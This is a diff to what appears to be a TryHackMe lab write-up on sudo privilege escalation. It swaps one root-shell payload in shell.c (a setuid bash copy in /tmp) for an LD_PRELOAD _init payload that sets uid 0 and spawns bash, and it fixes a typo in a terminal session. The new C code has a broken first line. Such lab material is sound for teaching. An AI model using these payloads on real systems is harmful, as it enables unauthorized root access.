@@ -46,13 +46,15 @@ Sudo file that do not have privilege escalation in gtfobin. In that case, google
 
 - Create shell.c file for exploit
 ~~~bash
-#include <stdio.h>
+include <stdio.h>
+#include <sys/types.h>
 #include <stdlib.h>
 
-static void inject() __attribute__((constructor));
-
-void inject() {
-    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+void _init() {
+   unsetenv("LD_PRELOAD");
+   setgid(0);
+   setuid(0);
+   system("/bin/bash");
 }
 ~~~
 
@@ -197,7 +199,7 @@ Warning: Permanently added '[10.10.61.109]:2222' (ED25519) to the list of known 
 tryhackme@10.10.61.109's password: 
 Last login: Fri Feb  7 00:14:41 2020 from 192.168.1.151
 tryhackme@sudo-privesc:~$ ls
-tryhackme@sudo-privesc:~$ sudo 0l
+tryhackme@sudo-privesc:~$ sudo -l
 [sudo] password for tryhackme: 
 sudo: 0l: command not found
 tryhackme@sudo-privesc:~$ sudo -l
